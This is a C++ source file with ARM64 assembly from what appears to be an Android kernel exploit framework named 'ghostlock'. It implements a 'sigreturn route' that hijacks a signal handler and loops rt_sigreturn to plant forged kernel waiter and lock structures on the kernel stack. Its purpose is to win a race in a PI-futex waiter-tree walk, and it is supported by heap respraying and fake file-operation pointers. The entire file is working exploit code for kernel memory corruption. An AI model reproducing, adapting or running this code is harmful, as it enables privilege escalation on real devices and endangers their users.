#include "route/sigreturn_route.h"

#include <cerrno>
#include <cstring>
#include <unistd.h>

using namespace ghostlock;

namespace {
    /* From arch/arm64/include/uapi/asm/sigcontext.h: `struct fpsimd_context`
     * is head {magic, size} + fpsr + fpcr + vregs[32] per record. */
    constexpr uint32_t kFpsimdMagic = 0x46508001;
    constexpr uint32_t kSveMagic = 0x53564501;
    constexpr std::size_t kFpsimdRecordVregs = 0x10;
    constexpr std::size_t kFpsimdRecordBytes = 0x210;
} // namespace

namespace ghostlock::route::sigreturn {
    bool geometry_from(const profile::SigreturnLayout &layout,
                       Geometry *out) noexcept {
        if (!layout.waiter_off_sve || !layout.waiter_off_plain) return false;
        const std::uint64_t sve = *layout.waiter_off_sve;
        const std::uint64_t plain = *layout.waiter_off_plain;
        /* Zero is refused: it is both a nonsense placement and the failure
         * value patch_fpstate() must not collide with. */
        if (sve == 0 || plain == 0) return false;
        if ((sve & 7U) != 0 || (plain & 7U) != 0) return false;
        if (sve > kCopyBytes - kStripBytes || plain > kCopyBytes - kStripBytes) {
            return false;
        }
        out->off_sve = static_cast<std::size_t>(sve);
        out->off_plain = static_cast<std::size_t>(plain);
        return true;
    }

    bool locate_fpstate(const void *reserved, std::size_t reserved_bytes,
                        FpState *out) noexcept {
        if (!reserved || !out) return false;
        const auto *bytes = static_cast<const unsigned char *>(reserved);
        std::size_t offset = 0;
        std::size_t fpsimd = SIZE_MAX;
        bool sve = false;
        /* The record list ends at a zero magic; a malformed size ends the walk
         * instead of being followed out of the buffer. */
        while (offset + 8 <= reserved_bytes) {
            uint32_t magic = 0;
            uint32_t size = 0;
            memcpy(&magic, bytes + offset, sizeof(magic));
            memcpy(&size, bytes + offset + 4, sizeof(size));
            if (magic == 0) break;
            if (size < 8 || size > reserved_bytes - offset) break;
            if (magic == kFpsimdMagic) {
                if (size < kFpsimdRecordBytes) break;
                fpsimd = offset;
            } else if (magic == kSveMagic) {
                sve = true;
            }
            offset += size;
        }
        if (fpsimd == SIZE_MAX) return false;
        out->vregs_offset = fpsimd + kFpsimdRecordVregs;
        out->sve = sve;
        return true;
    }

    bool patch_fpstate(void *reserved, std::size_t reserved_bytes,
                       const void *strip, std::size_t strip_bytes,
                       const Geometry &geometry, bool *sve_path) noexcept {
        if (!reserved || !strip || strip_bytes != kStripBytes) return false;
        FpState state{};
        if (!locate_fpstate(reserved, reserved_bytes, &state)) return false;
        const std::size_t offset = state.sve ? geometry.off_sve : geometry.off_plain;
        if (offset + strip_bytes > kCopyBytes) return false;
        if (state.vregs_offset + offset + strip_bytes > reserved_bytes) return false;
        memcpy(static_cast<unsigned char *>(reserved) + state.vregs_offset + offset,
               strip, strip_bytes);
        if (sve_path) *sve_path = state.sve;
        return true;
    }

    SigreturnRoute::SigreturnRoute(race::PiRace *race_context,
                                   const memory::WriteRequest *route_request,
                                   const profile::TargetProfile &profile_value,
                                   profile::SigreturnLayout route_layout) noexcept
        : race(race_context),
          request(route_request),
          profile(profile_value),
          layout(route_layout) {
        status.code = ROUTE_RETRYABLE;
    }

    int32_t SigreturnRoute::fail(int32_t step, int32_t error_number) noexcept {
        status.step = step;
        status.error_number = error_number;
        return -1;
    }

    void SigreturnRoute::disarm() noexcept {
        race->consumer_go.store(0);
        /* A call the attempt loop already found wedged is not waited on twice;
         * this poll itself writes over the frame that walk is reading. */
        if (!consumer_stuck && race->consumer_inflight.load() != 0) {
            for (int32_t i = 0;
                 i < 2000 && race->consumer_inflight.load() != 0;
                 i++) {
                usleep(1000);
            }
            consumer_stuck = race->consumer_inflight.load() != 0;
        }
        status.kernel_disarmed = !consumer_stuck;
    }

    void SigreturnRoute::destroy() noexcept {
        if (consumer_stuck) {
            (void) fail(38, status.error_number);
            status.code = ROUTE_DIRTY_FAILURE;
        }
        /* No trigger can be pending here: each tgkill is delivered on the
         * return path of its own syscall. Restore the mask first so the thread
         * is never reachable with the trigger defaulted. */
        if (mask_changed) {
            (void) pthread_sigmask(SIG_SETMASK, &previous_mask, nullptr);
        }
        if (handler_installed) {
            (void) sigaction(trigger_signal, &previous_action, nullptr);
            handler_installed = 0;
        }
        if (status.code != ROUTE_OK && status.kernel_disarmed &&
            status.code != ROUTE_DIRTY_FAILURE) {
            status.code = ROUTE_FALLBACK_SAFE;
        }
        status.userspace_clean = 1;
    }
} // namespace ghostlock::route::sigreturn

#if defined(__ANDROID__)
#include "common.h"

#include <ctime>
#include <ucontext.h>

#include "route/lock_anchor.h"
#include "route/route_lifecycle.hpp"
#include "route/route_policy.hpp"
#include "support/decls.hpp"

using namespace ghostlock;

/* File scope with C linkage: the trampoline addresses these by name, and LTO
 * is free to rename or drop internal linkage. */
extern "C" {
    [[gnu::used]] alignas(16) unsigned char ghostlock_loop_frame[0x2000];
    [[gnu::used]] alignas(16) unsigned char ghostlock_return_frame[0x2000];
    [[gnu::used]] unsigned long ghostlock_loop_deadline;
    [[gnu::used]] unsigned long ghostlock_loop_stamps;
    [[gnu::used]] unsigned long ghostlock_next_copy;
    [[gnu::used]] unsigned long ghostlock_copy_interval;

    /* Every rt_sigreturn in the loop resumes here. The spin between copies is
     * what keeps the strip stable for the walk: the kernel re-zeroes the same
     * depths at the top of each rt_sigreturn. */
    extern "C" __attribute__((naked, noinline)) void sigreturn_loop_trampoline() noexcept {
        __asm__ volatile(
            "mov x8, #139\n"                        /* __NR_rt_sigreturn */
            "1:\n"
            "mrs x9, cntvct_el0\n"
            "adrp x10, ghostlock_loop_deadline\n"
            "ldr x10, [x10, #:lo12:ghostlock_loop_deadline]\n"
            "cmp x9, x10\n"
            "b.hs 2f\n"
            "adrp x10, ghostlock_next_copy\n"
            "ldr x10, [x10, #:lo12:ghostlock_next_copy]\n"
            "cmp x9, x10\n"
            "b.lo 1b\n"
            "adrp x11, ghostlock_copy_interval\n"
            "ldr x11, [x11, #:lo12:ghostlock_copy_interval]\n"
            "add x10, x10, x11\n"
            "adrp x11, ghostlock_next_copy\n"
            "str x10, [x11, #:lo12:ghostlock_next_copy]\n"
            "adrp x10, ghostlock_loop_stamps\n"
            "ldr x11, [x10, #:lo12:ghostlock_loop_stamps]\n"
            "add x11, x11, #1\n"
            "str x11, [x10, #:lo12:ghostlock_loop_stamps]\n"
            "mov x8, #139\n"
            "svc #0\n"                              /* the copy, and back to the top */
            "b 1b\n"                                /* unreachable */
            "2:\n"
            "mov x8, #139\n"
            "adrp x9, ghostlock_return_frame\n"
            "add x9, x9, #:lo12:ghostlock_return_frame\n"
            "mov sp, x9\n"
            "svc #0\n"                              /* restores the interrupted context */
            "b .\n"                                 /* unreachable */
        );
    }
} /* extern "C" */

namespace {
    constexpr std::size_t kFrameBytes = 0x2000;
    constexpr int32_t kAttempts = 4;
    constexpr uint32_t kWalkDelayUs = 5000;
    constexpr int64_t kLoopWindowNs = 30000000;

    /* 500 us, from the measured arm: the crash is exposure to transient strip
     * states, and 500 us ran 4/4 where 20 us ran 4/6 and 100 us 2/4. */
    constexpr int64_t kCopyIntervalNs = 500000;

    /* Trigger candidates: the first one this process does not already handle.
     * SIGRTMIN is a libc call, so the list cannot be constexpr. */
    const int32_t kTriggerCandidates[] = {SIGUSR1, SIGRTMIN + 4, SIGRTMIN + 5};

    /* Synchronous faults stay deliverable so a stamp-path bug kills the thread
     * instead of wedging it. */
    constexpr int32_t kKeptSignals[] = {SIGSEGV, SIGBUS, SIGFPE, SIGILL, SIGABRT,
                                        SIGSYS, SIGTRAP};

    const std::byte *g_strip = nullptr;
    std::size_t g_strip_bytes = 0;
    ghostlock::route::sigreturn::Geometry g_geometry{};
    volatile sig_atomic_t g_patched = 0;
    volatile sig_atomic_t g_misses = 0;
    volatile sig_atomic_t g_last_path_sve = -1;
    volatile sig_atomic_t g_loop_armed = 0;
    unsigned long g_cntfrq = 0;

    [[nodiscard]] unsigned long long counter_ticks() noexcept {
        unsigned long long value = 0;
        __asm__ volatile("mrs %0, cntvct_el0" : "=r"(value));
        return value;
    }

    [[nodiscard]] unsigned long long ticks_for_ns(unsigned long long ns) noexcept {
        if (!g_cntfrq) return 0;
        return (ns * g_cntfrq) / 1000000000ULL;
    }

    /* Signal context: no syscalls, locks or allocation. */
    extern "C" void sigreturn_route_handler(int, siginfo_t *info, void *context) noexcept {
        if (!context || !info || !g_strip) {
            g_misses = g_misses + 1;
            return;
        }
        auto *uc = static_cast<ucontext_t *>(context);
        const std::ptrdiff_t uc_offset =
            reinterpret_cast<const char *>(context) - reinterpret_cast<const char *>(info);
        bool sve = false;
        if (!ghostlock::route::sigreturn::patch_fpstate(
                uc->uc_mcontext.__reserved, sizeof(uc->uc_mcontext.__reserved),
                g_strip, g_strip_bytes, g_geometry, &sve)) {
            g_misses = g_misses + 1;
            return;
        }
        g_last_path_sve = sve ? 1 : 0;
        g_patched = g_patched + 1;

        if (g_loop_armed == 0) return;

        /* Copy the frame twice: one is the way out, one the loop re-runs. */
        const auto *frame = reinterpret_cast<const unsigned char *>(info);
        memcpy(ghostlock_return_frame, frame, kFrameBytes);
        memcpy(ghostlock_loop_frame, frame, kFrameBytes);
        auto *loop_uc = reinterpret_cast<ucontext_t *>(ghostlock_loop_frame + uc_offset);
        auto *return_uc = reinterpret_cast<ucontext_t *>(ghostlock_return_frame + uc_offset);
        bool copy_sve = false;
        (void) ghostlock::route::sigreturn::patch_fpstate(
            loop_uc->uc_mcontext.__reserved, sizeof(loop_uc->uc_mcontext.__reserved),
            g_strip, g_strip_bytes, g_geometry, &copy_sve);
        (void) ghostlock::route::sigreturn::patch_fpstate(
            return_uc->uc_mcontext.__reserved, sizeof(return_uc->uc_mcontext.__reserved),
            g_strip, g_strip_bytes, g_geometry, &copy_sve);
        loop_uc->uc_mcontext.sp = reinterpret_cast<std::uint64_t>(ghostlock_loop_frame);
        loop_uc->uc_mcontext.pc =
            reinterpret_cast<std::uint64_t>(&sigreturn_loop_trampoline);
        uc->uc_mcontext.sp = reinterpret_cast<std::uint64_t>(ghostlock_loop_frame);
        uc->uc_mcontext.pc = reinterpret_cast<std::uint64_t>(&sigreturn_loop_trampoline);
    }

    /* No floating point after the first stamp: rt_sigreturn loads the strip
     * into every FP/SIMD register, so live values in d8-d15 become garbage. */
    int64_t elapsed_us(const timespec &start, const timespec &now) noexcept {
        return (static_cast<int64_t>(now.tv_sec) - static_cast<int64_t>(start.tv_sec)) * 1000000 +
               (static_cast<int64_t>(now.tv_nsec) - static_cast<int64_t>(start.tv_nsec)) / 1000;
    }

    int64_t now_us_since(const timespec &start) noexcept {
        timespec now{};
        (void) clock_gettime(CLOCK_MONOTONIC, &now);
        return elapsed_us(start, now);
    }
} // namespace

namespace ghostlock::route::sigreturn {
    bool SigreturnRoute::install_trigger() noexcept {
        struct sigaction action{};
        action.sa_sigaction = sigreturn_route_handler;
        action.sa_flags = SA_SIGINFO;
        sigemptyset(&action.sa_mask);
        for (const int32_t candidate : kTriggerCandidates) {
            struct sigaction current{};
            if (sigaction(candidate, nullptr, &current) != 0) continue;
            if (current.sa_handler != SIG_DFL) continue;
            if (sigaction(candidate, &action, &previous_action) != 0) continue;
            trigger_signal = candidate;
            handler_installed = 1;
            break;
        }
        if (!handler_installed) {
            pr_error("[route] sigreturn: every trigger candidate is already handled by this "
                     "process; refusing to take over another component's handler\n");
            return false;
        }
        /* Block every other async signal for the window: its handler would run
         * its own rt_sigreturn over the same kernel stack. */
        sigset_t block{};
        sigfillset(&block);
        for (const int32_t kept : kKeptSignals) sigdelset(&block, kept);
        sigdelset(&block, trigger_signal);
        if (pthread_sigmask(SIG_BLOCK, &block, &previous_mask) != 0) {
            pr_warning("[route] sigreturn: cannot block the window's signals (errno=%d); "
                       "continuing with whatever disposition the process has\n", errno);
        } else {
            mask_changed = 1;
        }
        sigset_t unblock{};
        sigemptyset(&unblock);
        sigaddset(&unblock, trigger_signal);
        (void) pthread_sigmask(SIG_UNBLOCK, &unblock, nullptr);
        trigger_tid = static_cast<int32_t>(syscall(__NR_gettid));
        trigger_pid = getpid();
        unsigned long long frequency = 0;
        __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(frequency));
        g_cntfrq = static_cast<unsigned long>(frequency);
        pr_info("[route] sigreturn trigger: signal=%d tid=%d cntfrq=%lu (SIGUSR1 preferred, RT "
                "fallbacks; the previous disposition is restored at destroy)\n",
                trigger_signal, trigger_tid, g_cntfrq);
        return true;
    }

    bool SigreturnRoute::build_stamp(int32_t attempt) noexcept {
        uintptr_t lock = session::g_exploit_session.heap.current.fake_lock;
        if (layout.lock_anchor_image) {
            uintptr_t slot = 0;
            const uintptr_t anchored = anchor::acquire_lock_word(
                *layout.lock_anchor_image, layout.lock_anchor_bytes,
                layout.lock_anchor_stride, attempt, &slot);
            if (anchored == 0) return false;
            lock = anchored;
        }
        const memory::PayloadWriteLayout stamp_layout = {
            .parent = (session::g_exploit_session.heap.current.fake_parent),
            .right = (session::g_exploit_session.heap.current.fake_right),
            .left = (session::g_exploit_session.heap.current.fake_left),
        };
        const memory::WaiterTreeStamp stamp = memory::waiter_tree_stamp(stamp_layout);
        pr_info("[route] tree stamp pc=0x%llx right=0x%llx left=0x%llx target=0x%llx\n",
                static_cast<unsigned long long>(stamp.pc),
                static_cast<unsigned long long>(stamp.right),
                static_cast<unsigned long long>(stamp.left),
                static_cast<unsigned long long>(request->target));
        /* Step [9]'s wake reads this word once; a real running task makes it
         * cheap. */
        const memory::WaiterWords words = memory::waiter_words(
            stamp_layout, ghostlock::profile::slide_init_task(), lock,
            kernel::waiter_prio_word(
                    kernel::FAKE_WAITER_PRIO,
                    session::g_exploit_session.profile.compact_waiter_has_wake_state()));
        if (!memory::encode_waiter_words(strip, 0, words)) {
            pr_warning("sigreturn stamp does not fit its window (%zu bytes)\n", strip.size());
            return false;
        }
        lock_word = lock;
        g_strip = strip.data();
        g_strip_bytes = strip.size();
        g_geometry = geometry;
        return true;
    }

    int32_t SigreturnRoute::prepare() noexcept {
        if (!(session::g_exploit_session.heap.current.base) ||
            !(session::g_exploit_session.heap.current.fake_lock) ||
            !(session::g_exploit_session.heap.current.fake_fops)) {
            pr_warning("sigreturn route missing kernel page base=%016zx lock=%016zx "
                       "fops=%016zx\n", (session::g_exploit_session.heap.current.base),
                       (session::g_exploit_session.heap.current.fake_lock),
                       (session::g_exploit_session.heap.current.fake_fops));
            return fail(30, 0);
        }
        if (!geometry_from(layout, &geometry)) {
            pr_error("[route] sigreturn geometry unusable (off_sve=0x%llx off_plain=0x%llx): "
                     "both offsets must be present, 8-aligned, non-zero, and leave room for "
                     "the 0x%zx-byte waiter strip inside the 0x%zx-byte copy window -- this "
                     "profile's kernel has no measured sigreturn geometry\n",
                     static_cast<unsigned long long>(layout.waiter_off_sve.value_or(0)),
                     static_cast<unsigned long long>(layout.waiter_off_plain.value_or(0)),
                     kStripBytes, kCopyBytes);
            return fail(36, EINVAL);
        }
        if (!install_trigger()) return fail(37, EINVAL);
        if (!build_stamp(1)) return fail(34, ENOSPC);
        return 0;
    }

    void SigreturnRoute::stamp_window(const timespec &started) noexcept {
        (void) started;
        ghostlock_loop_stamps = 0;
        ghostlock_copy_interval = ticks_for_ns(kCopyIntervalNs);
        ghostlock_next_copy = counter_ticks();          /* first copy immediately */
        ghostlock_loop_deadline = counter_ticks() + ticks_for_ns(kLoopWindowNs);
        g_loop_armed = 1;
        (void) syscall(__NR_tgkill, trigger_pid, trigger_tid, trigger_signal);
    }

    route::RouteStatus SigreturnRoute::execute() noexcept {
        struct timespec route_t0{};
        clock_gettime(CLOCK_MONOTONIC, &route_t0);
        int32_t calls_total = 0;
        int32_t successes_total = 0;
        for (int32_t attempt = 1; attempt <= kAttempts; attempt++) {
            if (attempt > 1) {
                /* A lost race clobbers the page, so every retry resprays and
                 * re-derives fake_* before a new slot is drawn. */
                const uintptr_t rebuilt = support::prepare_good_kernel_page(*request);
                if (!rebuilt || !(session::g_exploit_session.heap.current.fake_lock) ||
                    !(session::g_exploit_session.heap.current.fake_fops)) {
                    pr_warning("sigreturn retry page prepare failed attempt=%d\n", attempt);
                    (void) fail(35, errno);
                    break;
                }
                if (!build_stamp(attempt)) {
                    (void) fail(34, ENOSPC);
                    break;
                }
            }

            race->consumer_calls.store(0);
            race->consumer_success.store(0);
            race->consumer_stop.store(0);
            race->route_delay_usec.store(kWalkDelayUs);
            race->consumer_go.store(attempt);

            const int32_t patched_before = g_patched;
            pr_info("sigreturn pre-stamp attempt=%d/%d off_sve=0x%zx off_plain=0x%zx "
                    "lock=0x%llx +%lldms\n",
                    attempt, kAttempts, geometry.off_sve, geometry.off_plain,
                    static_cast<unsigned long long>(lock_word),
                    static_cast<long long>(now_us_since(route_t0) / 1000));
            stamp_window(route_t0);
            /* The walk reads this thread's stack and outlives the window; drain
             * it before anything writes over that stack. */
            const int32_t drain_ms =
                    race->wait_consumer_idle(ghostlock::race::PiRace::kConsumerDrainMs);
            if (route::route_needs_ghost_disarm(session::g_exploit_session.profile)) {
                int32_t disarm_errno = 0;
                (void) support::ghost_disarm("attempt", &disarm_errno);
            }
            pr_info("sigreturn post-stamp attempt=%d/%d stamps=%d copies=%lu misses=%d "
                    "path_sve=%d drain=%dms +%lldms\n",
                    attempt, kAttempts, g_patched - patched_before,
                    ghostlock_loop_stamps, g_misses,
                    g_last_path_sve, drain_ms,
                    static_cast<long long>(now_us_since(route_t0) / 1000));

            const int32_t calls = race->consumer_calls.load();
            const int32_t successes = race->consumer_success.load();
            calls_total += calls;
            successes_total += successes;
            if (drain_ms >= 0 && calls > 0 && successes > 0) {
                status.code = ROUTE_OK;
                status.step = 0;
                status.error_number = 0;
                break;
            }
            if (drain_ms < 0) {
                /* A wedged walk: another attempt would only pour more writes
                 * over it. */
                consumer_stuck = 1;
                (void) fail(38, 0);
                status.code = ROUTE_DIRTY_FAILURE;
                break;
            }
            (void) fail(33, 0);
        }
        stamps = g_patched;
        stamp_misses = g_misses;
        consumer_calls = calls_total;
        consumer_successes = successes_total;
        return status;
    }
} // namespace ghostlock::route::sigreturn

namespace ghostlock::route {
    RouteStatus do_sigreturn_fake_lock_route(const memory::WriteRequest *request) {
        sigreturn::SigreturnRoute context(
            &session::g_exploit_session.race, request, session::g_exploit_session.profile,
            session::g_exploit_session.profile.sigreturn_layout());
        const RouteStatus status = run_route_lifecycle(context);

        pr_info("sigreturn route done calls=%d success=%d status=%d clean=%d/%d "
                "step=%d errno=%d stamps=%d misses=%d lock=0x%llx\n",
                context.consumer_calls, context.consumer_successes,
                context.status.code, context.status.userspace_clean,
                context.status.kernel_disarmed, context.status.step,
                context.status.error_number, context.stamps, context.stamp_misses,
                static_cast<unsigned long long>(context.lock_word));
        return status;
    }
} // namespace ghostlock::route
#endif // __ANDROID__
